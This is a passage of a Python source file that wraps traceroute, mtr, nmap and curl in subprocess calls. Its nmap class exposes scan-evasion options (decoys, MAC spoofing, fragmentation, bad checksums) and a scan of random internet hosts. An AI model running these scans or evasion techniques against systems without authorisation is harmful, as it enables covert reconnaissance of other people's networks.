    @staticmethod
    def queries(target: str, queries: int) -> CommandResult:
        """Traceroute with queries per hop"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-q', str(queries), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wait(target: str, seconds: int) -> CommandResult:
        """Traceroute with wait time"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-w', str(seconds), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def port(target: str, port: int) -> CommandResult:
        """Traceroute to specific port"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-p', str(port), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def numeric(target: str) -> CommandResult:
        """Traceroute with numeric output"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-n', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def verbose(target: str) -> CommandResult:
        """Verbose traceroute"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-v', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def debug(target: str) -> CommandResult:
        """Debug traceroute"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-d', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dont_fragment(target: str) -> CommandResult:
        """Traceroute with no fragmentation"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-F', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def interface(target: str, interface: str) -> CommandResult:
        """Traceroute using interface"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-i', interface, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def source(target: str, source_ip: str) -> CommandResult:
        """Traceroute with source IP"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-s', source_ip, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def tos(target: str, tos: int) -> CommandResult:
        """Traceroute with TOS"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-t', str(tos), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def as_lookup(target: str) -> CommandResult:
        """Traceroute with AS lookup"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-A', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def mtr(target: str) -> CommandResult:
        """MTR traceroute"""
        start_time = time.time()
        try:
            cmd = ['mtr', '--report', '--report-cycles', '1', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def mtr_json(target: str) -> CommandResult:
        """MTR JSON output"""
        start_time = time.time()
        try:
            cmd = ['mtr', '--json', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def mtr_csv(target: str) -> CommandResult:
        """MTR CSV output"""
        start_time = time.time()
        try:
            cmd = ['mtr', '--csv', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def tcptraceroute(target: str) -> CommandResult:
        """TCP traceroute"""
        start_time = time.time()
        try:
            cmd = ['tcptraceroute', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def lft(target: str) -> CommandResult:
        """Layer Four Traceroute"""
        start_time = time.time()
        try:
            cmd = ['lft', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ipv6(target: str) -> CommandResult:
        """IPv6 traceroute"""
        start_time = time.time()
        try:
            cmd = ['traceroute6', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def help() -> CommandResult:
        """Traceroute help"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '--help']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version() -> CommandResult:
        """Traceroute version"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-V']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))

# =====================
# NMAP COMMANDS (60+)
# =====================
class NmapCommands:
    """All nmap command variants"""
    
    @staticmethod
    def basic(target: str) -> CommandResult:
        """Basic nmap scan"""
        return NetworkTools.nmap(target)
    
    @staticmethod
    def quick(target: str) -> CommandResult:
        """Quick port scan"""
        return NetworkTools.nmap(target, 'quick')
    
    @staticmethod
    def full(target: str) -> CommandResult:
        """Full port scan"""
        return NetworkTools.nmap(target, 'full')
    
    @staticmethod
    def service(target: str) -> CommandResult:
        """Service version detection"""
        return NetworkTools.nmap(target, 'service')
    
    @staticmethod
    def os_detection(target: str) -> CommandResult:
        """OS detection"""
        return NetworkTools.nmap(target, 'os')
    
    @staticmethod
    def udp(target: str) -> CommandResult:
        """UDP scan"""
        return NetworkTools.nmap(target, 'udp')
    
    @staticmethod
    def vuln(target: str) -> CommandResult:
        """Vulnerability scan"""
        return NetworkTools.nmap(target, 'vuln')
    
    @staticmethod
    def stealth(target: str) -> CommandResult:
        """Stealth SYN scan"""
        return NetworkTools.nmap(target, 'stealth')
    
    @staticmethod
    def aggressive(target: str) -> CommandResult:
        """Aggressive scan"""
        return NetworkTools.nmap(target, 'aggressive')
    
    @staticmethod
    def comprehensive(target: str) -> CommandResult:
        """Comprehensive scan"""
        return NetworkTools.nmap(target, 'comprehensive')
    
    @staticmethod
    def ping_scan(target: str) -> CommandResult:
        """Ping scan"""
        return NetworkTools.nmap(target, 'ping')
    
    @staticmethod
    def ports(target: str, ports: str) -> CommandResult:
        """Scan specific ports"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-p', ports, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def script(target: str, script: str) -> CommandResult:
        """Run NSE script"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--script', script, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def output(target: str, output_file: str) -> CommandResult:
        """Output to file"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-oN', output_file, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def exclude(target: str, exclude: str) -> CommandResult:
        """Exclude hosts"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--exclude', exclude, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def input_file(file_path: str) -> CommandResult:
        """Scan from input file"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-iL', file_path]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def random_targets(count: int) -> CommandResult:
        """Scan random targets"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-iR', str(count)]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def timing(target: str, level: int) -> CommandResult:
        """Timing template"""
        start_time = time.time()
        try:
            cmd = ['nmap', f'-T{level}', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        """Traceroute scan"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--traceroute', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version() -> CommandResult:
        """Nmap version"""
        return NetworkTools.nmap('', 'version')
    
    @staticmethod
    def help() -> CommandResult:
        """Nmap help"""
        return NetworkTools.nmap('', 'help')
    
    @staticmethod
    def syn_scan(target: str) -> CommandResult:
        """SYN scan"""
        return NetworkTools.nmap(target, 'syn')
    
    @staticmethod
    def connect_scan(target: str) -> CommandResult:
        """TCP connect scan"""
        return NetworkTools.nmap(target, 'connect')
    
    @staticmethod
    def ack_scan(target: str) -> CommandResult:
        """ACK scan"""
        return NetworkTools.nmap(target, 'ack')
    
    @staticmethod
    def fin_scan(target: str) -> CommandResult:
        """FIN scan"""
        return NetworkTools.nmap(target, 'fin')
    
    @staticmethod
    def xmas_scan(target: str) -> CommandResult:
        """XMAS scan"""
        return NetworkTools.nmap(target, 'xmas')
    
    @staticmethod
    def null_scan(target: str) -> CommandResult:
        """NULL scan"""
        return NetworkTools.nmap(target, 'null')
    
    @staticmethod
    def default_scripts(target: str) -> CommandResult:
        """Default scripts"""
        return NetworkTools.nmap(target, 'script')
    
    @staticmethod
    def top_ports(target: str, count: int) -> CommandResult:
        """Top ports scan"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--top-ports', str(count), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def open_only(target: str) -> CommandResult:
        """Show open ports only"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--open', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def reason(target: str) -> CommandResult:
        """Show port state reasons"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--reason', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def packet_trace(target: str) -> CommandResult:
        """Packet trace"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--packet-trace', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def iflist() -> CommandResult:
        """List interfaces"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--iflist']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_ping(target: str) -> CommandResult:
        """Skip host discovery"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-Pn', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def fast_scan(target: str) -> CommandResult:
        """Fast scan (top 100 ports)"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-F', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def fragment(target: str) -> CommandResult:
        """Fragment packets"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-f', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def decoys(target: str, count: int) -> CommandResult:
        """Use decoys"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-D', f'RND:{count}', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def source_port(target: str, port: int) -> CommandResult:
        """Use source port"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-g', str(port), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def data_length(target: str, length: int) -> CommandResult:
        """Send data with packets"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--data-length', str(length), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ttl(target: str, ttl: int) -> CommandResult:
        """Set TTL"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--ttl', str(ttl), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def spoof_mac(target: str, mac: str) -> CommandResult:
        """Spoof MAC address"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--spoof-mac', mac, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def badsum(target: str) -> CommandResult:
        """Send packets with bad checksum"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--badsum', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def send_eth(target: str) -> CommandResult:
        """Send raw ethernet packets"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--send-eth', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def send_ip(target: str) -> CommandResult:
        """Send raw IP packets"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--send-ip', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def privileged(target: str) -> CommandResult:
        """Assume privileged user"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--privileged', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def unprivileged(target: str) -> CommandResult:
        """Assume unprivileged user"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--unprivileged', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def release_memory(target: str) -> CommandResult:
        """Release memory before scan"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--release-memory', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version_intensity(target: str, intensity: int) -> CommandResult:
        """Set version detection intensity"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--version-intensity', str(intensity), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version_light(target: str) -> CommandResult:
        """Light version detection"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--version-light', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version_all(target: str) -> CommandResult:
        """Try all version probes"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--version-all', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def osscan_limit(target: str) -> CommandResult:
        """Limit OS detection"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--osscan-limit', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def osscan_guess(target: str) -> CommandResult:
        """Guess OS aggressively"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--osscan-guess', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_os_tries(target: str, tries: int) -> CommandResult:
        """Max OS detection tries"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--max-os-tries', str(tries), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_retries(target: str, retries: int) -> CommandResult:
        """Max retries"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--max-retries', str(retries), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def host_timeout(target: str, timeout: str) -> CommandResult:
        """Host timeout"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--host-timeout', timeout, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def scan_delay(target: str, delay: str) -> CommandResult:
        """Scan delay"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--scan-delay', delay, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_scan_delay(target: str, delay: str) -> CommandResult:
        """Max scan delay"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--max-scan-delay', delay, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def min_rate(target: str, rate: int) -> CommandResult:
        """Minimum packet rate"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--min-rate', str(rate), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_rate(target: str, rate: int) -> CommandResult:
        """Maximum packet rate"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--max-rate', str(rate), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def min_parallelism(target: str, parallelism: int) -> CommandResult:
        """Minimum parallelism"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--min-parallelism', str(parallelism), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_parallelism(target: str, parallelism: int) -> CommandResult:
        """Maximum parallelism"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--max-parallelism', str(parallelism), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def defeat_rst_ratelimit(target: str) -> CommandResult:
        """Defeat RST rate limit"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--defeat-rst-ratelimit', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def defeat_icmp_ratelimit(target: str) -> CommandResult:
        """Defeat ICMP rate limit"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--defeat-icmp-ratelimit', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nsock_engine(target: str) -> CommandResult:
        """Use nsock engine"""
        start_time = time.time()
        try:
            cmd = ['nmap', '--nsock-engine', 'epoll', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))

# =====================
# CURL COMMANDS (60+)
# =====================
class CurlCommands:
    """All curl command variants"""
    
    @staticmethod
    def basic(url: str) -> CommandResult:
        """Basic curl request"""
        return NetworkTools.curl(url)
    
    @staticmethod
    def get(url: str) -> CommandResult:
        """GET request"""
        return NetworkTools.curl(url, 'GET')
    
    @staticmethod
    def post(url: str, data: str) -> CommandResult:
        """POST request"""
        return NetworkTools.curl(url, 'POST', data)
    
    @staticmethod
    def put(url: str, data: str) -> CommandResult:
        """PUT request"""
        return NetworkTools.curl(url, 'PUT', data)
    
    @staticmethod
    def delete(url: str) -> CommandResult:
        """DELETE request"""
        return NetworkTools.curl(url, 'DELETE')
    
    @staticmethod
    def patch(url: str, data: str) -> CommandResult:
        """PATCH request"""
        return NetworkTools.curl(url, 'PATCH', data)
    
    @staticmethod
    def head(url: str) -> CommandResult:
        """HEAD request"""
        return NetworkTools.curl(url, 'HEAD')
    
    @staticmethod
    def options(url: str) -> CommandResult:
        """OPTIONS request"""
        return NetworkTools.curl(url, 'OPTIONS')
    
    @staticmethod
    def output(url: str, output_file: str) -> CommandResult:
        """Output to file"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-o', output_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def remote_name(url: str) -> CommandResult:
        """Use remote filename"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-O', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(url: str) -> CommandResult:
        """Follow redirects"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-L', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def include(url: str) -> CommandResult:
        """Include headers"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-i', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def verbose(url: str) -> CommandResult:
        """Verbose output"""
        start_time = time.time()
        try:
            cmd = ['curl', '-v', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def silent(url: str) -> CommandResult:
        """Silent mode"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def show_error(url: str) -> CommandResult:
        """Show errors"""
        start_time = time.time()
        try:
            cmd = ['curl', '-sS', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def fail(url: str) -> CommandResult:
        """Fail on error"""
        start_time = time.time()
        try:
            cmd = ['curl', '-sf', url]
